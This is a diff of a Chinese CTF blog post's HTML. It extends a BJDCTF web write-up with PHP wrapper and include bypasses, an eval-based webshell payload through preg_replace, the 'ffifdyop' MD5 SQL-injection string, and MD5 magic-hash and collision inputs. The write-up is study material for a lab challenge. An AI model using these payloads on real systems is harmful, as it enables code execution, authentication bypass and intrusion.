@@ -47,16 +47,17 @@
     sidebarPadding: 40
   };
 </script>
-  <meta name="description" content="看到这题名字还是很不爽的，毕竟我也是个浙江人，不过zjctf，有一说一确实。">
+  <meta name="description" content="ZJCTF，就这？看到这题名字还是很不爽的，毕竟我也是个浙江人，不过zjctf，有一说一确实。BUU上和源题好像有点差别。进题放出源码： 1&amp;lt;?php2error_reporting(0);3$text &amp;#x3D; $_GET[&amp;quot;text&amp;quot;];4$file &amp;#x3D; $_GET[&amp;quot;file&amp;quot;];5if(isset($text)&amp;amp;&amp;am">
 <meta name="keywords" content="PHP">
 <meta property="og:type" content="article">
-<meta property="og:title" content="BJDCTF-web-(ZJCTF，就这?)">
+<meta property="og:title" content="BJDCTF-web-复现">
 <meta property="og:url" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;02&#x2F;08&#x2F;BJDCTF-web-ZJCTF%EF%BC%8C%E5%B0%B1%E8%BF%99&#x2F;index.html">
 <meta property="og:site_name" content="Chen&#39;Blog">
-<meta property="og:description" content="看到这题名字还是很不爽的，毕竟我也是个浙江人，不过zjctf，有一说一确实。">
+<meta property="og:description" content="ZJCTF，就这？看到这题名字还是很不爽的，毕竟我也是个浙江人，不过zjctf，有一说一确实。BUU上和源题好像有点差别。进题放出源码： 1&amp;lt;?php2error_reporting(0);3$text &amp;#x3D; $_GET[&amp;quot;text&amp;quot;];4$file &amp;#x3D; $_GET[&amp;quot;file&amp;quot;];5if(isset($text)&amp;amp;&amp;am">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;02&#x2F;08&#x2F;BJDCTF-web-ZJCTF%EF%BC%8C%E5%B0%B1%E8%BF%99&#x2F;1.jpg">
-<meta property="og:updated_time" content="2020-02-08T11:23:03.089Z">
+<meta property="og:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;02&#x2F;08&#x2F;BJDCTF-web-ZJCTF%EF%BC%8C%E5%B0%B1%E8%BF%99&#x2F;2.jpg">
+<meta property="og:updated_time" content="2020-02-13T11:09:29.995Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;chenzidu.github.io&#x2F;2020&#x2F;02&#x2F;08&#x2F;BJDCTF-web-ZJCTF%EF%BC%8C%E5%B0%B1%E8%BF%99&#x2F;1.jpg">
 
@@ -74,7 +75,7 @@
   };
 </script>
 
-  <title>BJDCTF-web-(ZJCTF，就这?) | Chen'Blog</title>
+  <title>BJDCTF-web-复现 | Chen'Blog</title>
   
 
 
@@ -232,7 +233,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          BJDCTF-web-(ZJCTF，就这?)
+          BJDCTF-web-复现
         </h1>
 
         <div class="post-meta">
@@ -241,10 +242,16 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2020-02-08 16:35:24 / 修改时间：19:23:03" itemprop="dateCreated datePublished" datetime="2020-02-08T16:35:24+08:00">2020-02-08</time>
+              <time title="创建时间：2020-02-08 16:35:24" itemprop="dateCreated datePublished" datetime="2020-02-08T16:35:24+08:00">2020-02-08</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-02-13 19:09:29" itemprop="dateModified" datetime="2020-02-13T19:09:29+08:00">2020-02-13</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
@@ -268,10 +275,9 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>看到这题名字还是很不爽的，毕竟我也是个浙江人，不过zjctf，有一说一确实。</p>
-<a id="more"></a>
-<p>BUU上和源题好像有点差别。</p>
-<p>进题放出源码：</p>
+        <a id="more"></a>
+
+<h2 id="ZJCTF，就这？"><a href="#ZJCTF，就这？" class="headerlink" title="ZJCTF，就这？"></a>ZJCTF，就这？</h2><p>看到这题名字还是很不爽的，毕竟我也是个浙江人，不过zjctf，有一说一确实。<br><br>BUU上和源题好像有点差别。<br><br>进题放出源码：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$text &#x3D; $_GET[&quot;text&quot;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$file &#x3D; $_GET[&quot;file&quot;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;I have a dream&quot;))&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;&#x2F;h1&gt;&lt;&#x2F;br&gt;&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        die(&quot;Not now!&quot;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">    include($file);  &#x2F;&#x2F;next.php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">    </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">else&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">    highlight_file(__FILE__);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure>
 <p>file_get_contents($text,’r’)===”I have a dream”)，<br>读取$text文件内容为I have a dream,想到data://伪协议。<br>看到官方wp还可以远程读取，对不起我是弟弟。</p>
 <p><code>?text=data://text/plain,I%20have%20a%20dream</code><br><br>绕过第一个。</p>
@@ -282,6 +288,24 @@
 <p><code>next.php?\S*=${phpinfo()}</code><br>可以用,poc直接打。</p>
 <p><code>next.php?\S*=${eval($_POST[cmd])}</code></p>
 <p>连上木马后找到flag</p>
+<h2 id="easy-md5"><a href="#easy-md5" class="headerlink" title="easy_md5"></a>easy_md5</h2><p><strong>我注入真菜</strong></p>
+<p>F12 看到有个<br><br>hint:  <code>select * from &#39;admin&#39; where password=md5($pass,true)</code><br>得到sql语句.</p>
+<p><a href="http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/" target="_blank" rel="noopener">Leet More 2010 Jailbreak writeup</a></p>
+<p>总结: <strong>ffifdyop</strong><br>这个字符串其哈希值：276f722736c95d99e921722cf9ed621c<br><br>字符串: ‘or’6 <trash><br></p>
+<p>select * from admin where password=’’or’6<trash>‘<br>相当于select * from admin where password=’’or 1  实现注入.<br></p>
+<p>然后跳转到新页面<br><img src="2.jpg" alt=""></p>
+<p>审查页面元素:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$a &#x3D; $GET[&#39;a&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$b &#x3D; $_GET[&#39;b&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">if($a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b))&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    &#x2F;&#x2F; wow, glzjin wants a girl friend.</span></pre></td></tr></table></figure>
+<p>赵总又来找女朋友了!</p>
+<p>get传A和b都是0e开头就行<br><br>payload:<br><br><code>?a=s155964671a&amp;b=2120624</code><br>跳转到第三个页面.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">include &quot;flag.php&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">if($_POST[&#39;param1&#39;]!&#x3D;&#x3D;$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])&#x3D;&#x3D;&#x3D;md5($_POST[&#39;param2&#39;]))&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    echo $flag;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
+<p>要求我们post三个,但是他和上面不同,上面那个是两个等号,下面是三个等号,全等.可以考虑MD5生日攻击,还有MD5不支持数组,如果你param1和param2是数组传入,则MD5等号两边都是false也成立.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">param1&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;param2&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span></pre></td></tr></table></figure>
+<p>或者直接数组传入就行param1[]=1,param2[]=2</p>
+<p><a href="https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value" target="_blank" rel="noopener">参考网址</a></p>
+<p>postman的话,我这边要改成raw格式才能撞进去,我去!!注意格式问题.</p>
+<p><a href="https://www.suk1.top/" target="_blank" rel="noopener">感谢晓黑老哥</a></p>
+<h2 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h2><p>明日继续<del>~</del></p>
 
     </div>
 
@@ -344,6 +368,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ZJCTF，就这？"><span class="nav-number">1.</span> <span class="nav-text">ZJCTF，就这？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easy-md5"><span class="nav-number">2.</span> <span class="nav-text">easy_md5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#未完待续"><span class="nav-number">3.</span> <span class="nav-text">未完待续</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
